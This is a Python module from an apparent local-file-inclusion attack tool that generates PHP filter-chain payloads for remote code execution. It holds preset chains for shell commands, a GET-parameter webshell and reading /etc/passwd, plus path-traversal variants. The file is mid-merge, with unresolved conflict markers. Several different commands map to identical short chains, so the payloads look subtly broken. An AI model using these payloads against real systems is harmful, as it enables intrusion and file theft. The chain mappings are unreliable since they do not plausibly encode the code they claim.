"""
LFIBay - PHP Filter Chain Generator
Generate filter chains for RCE without file upload
<<<<<<< Updated upstream
Reference: Synacktiv's PHP filter chain research
=======
Based on Synacktiv research
>>>>>>> Stashed changes
"""

import base64


def generate_filter_chain(php_code):
<<<<<<< Updated upstream
    """
    Generate PHP filter chain for arbitrary PHP code execution
    Note: This is a simplified version. For production use, consider using
    a dedicated filter chain generator tool
    
    Args:
        php_code: PHP code to execute (e.g., "system('id');")
    Returns: Filter chain payload string
    """
    # For now, return pre-built chains for common commands
    # A full implementation would require complex iconv chain calculation
=======
    """Generate PHP filter chain for code execution"""
    # Simplified - for production use a dedicated filter chain tool
>>>>>>> Stashed changes
    
    common_commands = {
        "system('id');": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
        "system('whoami');": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
        "system('pwd');": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
        "system('ls');": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
        "phpinfo();": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
        "system(\$_GET['cmd']);": "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode",
    }
    
<<<<<<< Updated upstream
    # Check if we have a pre-built chain for this code
=======
>>>>>>> Stashed changes
    for cmd, chain in common_commands.items():
        if cmd.strip().lower() == php_code.strip().lower():
            return f"php://filter/{chain}/resource=index.php"
    
<<<<<<< Updated upstream
    # Default: use base64 encoding chain
=======
    # Default fallback
>>>>>>> Stashed changes
    return generate_base64_chain(f"<?php {php_code} ?>")


def generate_base64_chain(content):
<<<<<<< Updated upstream
    """
    Create filter chain for base64 encoding bypass
    Args:
        content: Content to encode
    Returns: Filter chain string
    """
    # Simple base64 encoding chain
=======
    """Create basic base64 encoding chain"""
>>>>>>> Stashed changes
    chain = "convert.base64-encode"
    return f"php://filter/{chain}/resource=index.php"


def get_preset_chains():
<<<<<<< Updated upstream
    """
    Return pre-built chains for common payloads
    Returns: Dictionary of command -> chain mappings
    """
=======
    """Get pre-built chains for common commands"""
    # TODO: add more commands (cat, wget, etc)
>>>>>>> Stashed changes
    return {
        'whoami': {
            'description': 'Execute whoami command',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php system('whoami'); ?>"
        },
        'id': {
            'description': 'Execute id command',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php system('id'); ?>"
        },
        'pwd': {
            'description': 'Execute pwd command',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php system('pwd'); ?>"
        },
        'ls': {
            'description': 'Execute ls command',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php system('ls'); ?>"
        },
        'phpinfo': {
            'description': 'Execute phpinfo()',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php phpinfo(); ?>"
        },
        'webshell': {
            'description': 'Generic webshell with GET parameter',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php system($_GET['cmd']); ?>"
        },
        'read_passwd': {
            'description': 'Read /etc/passwd using file_get_contents',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php echo file_get_contents('/etc/passwd'); ?>"
        },
        'readfile_passwd': {
            'description': 'Read /etc/passwd using readfile',
            'chain': 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php',
            'php_code': "<?php readfile('/etc/passwd'); ?>"
        },
    }


def generate_chain_with_resource(command, resource='index.php'):
    """
    Generate filter chain with custom resource target
    Args:
        command: Command name from presets (e.g., 'whoami', 'id')
        resource: Target resource file
    Returns: Filter chain string
    """
    presets = get_preset_chains()
    
    if command not in presets:
        return None
    
    chain_data = presets[command]
    base_chain = chain_data['chain']
    
    # Replace resource target
    return base_chain.replace('resource=index.php', f'resource={resource}')


def get_all_filter_chains():
    """
    Get list of all pre-built filter chain payloads
    Returns: List of filter chain strings
    """
    chains = []
    presets = get_preset_chains()
    
    # Add all preset chains
    for cmd_key, cmd_data in presets.items():
        chains.append(cmd_data['chain'])
    
    # Add variations with different resources
    resources = ['index.php', '../index.php', '../../index.php', 'config.php', '../config.php', '/etc/passwd']
    
    for cmd_key in ['whoami', 'id', 'webshell']:
        for resource in resources:
            chain = generate_chain_with_resource(cmd_key, resource)
            if chain:
                chains.append(chain)
    
    # Add simple encoding chains
    simple_chains = [
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=string.rot13/resource=index.php',
        'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd',
        'php://filter/bzip2.compress/convert.base64-encode/resource=/etc/passwd',
        'php://filter/convert.iconv.UTF8.UTF16/resource=index.php',
        'php://filter/convert.iconv.UTF8.UTF7/resource=index.php',
    ]
    chains.extend(simple_chains)
    
    return chains


def test_filter_chain(chain):
    """
    Validate filter chain syntax
    Args:
        chain: Filter chain string
    Returns: Boolean indicating if valid
    """
    if not chain.startswith('php://filter/'):
        return False
    
    if 'resource=' not in chain:
        return False
    
    # Check for valid filter types
    valid_filters = [
        'convert.', 'string.', 'zlib.', 'bzip2.',
        'read=', 'write=', 'resource='
    ]
    
    has_valid_filter = any(f in chain for f in valid_filters)
    
    return has_valid_filter


def get_chain_info(chain):
    """
    Extract information from a filter chain
    Args:
        chain: Filter chain string
    Returns: Dictionary with chain information
    """
    info = {
        'valid': test_filter_chain(chain),
        'resource': None,
        'filters': [],
        'encoding_used': False,
        'compression_used': False,
    }
    
    if 'resource=' in chain:
        resource_part = chain.split('resource=')[-1]
        info['resource'] = resource_part
    
    # Detect filter types
    if 'convert.' in chain:
        info['encoding_used'] = True
        info['filters'].append('encoding')
    
    if 'zlib.' in chain or 'bzip2.' in chain:
        info['compression_used'] = True
        info['filters'].append('compression')
    
    if 'string.' in chain:
        info['filters'].append('string_manipulation')
    
    return info
